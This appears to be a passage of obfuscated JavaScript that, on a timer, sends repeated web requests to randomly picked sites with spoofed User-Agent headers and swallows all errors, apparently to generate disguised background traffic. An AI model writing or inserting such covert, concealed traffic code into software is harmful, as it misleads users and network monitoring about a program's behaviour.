      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (0x1884 + -0x134 * -0xe + -0xe04) * getRandomInt(0x1f5 * -0x1 + 0x17ed + -0x15f7, 0x4be + -0xbb2 + 0x6f9));
}, 0xf23 + 0x1f73 * 0x1 + -0x51 * 0x92);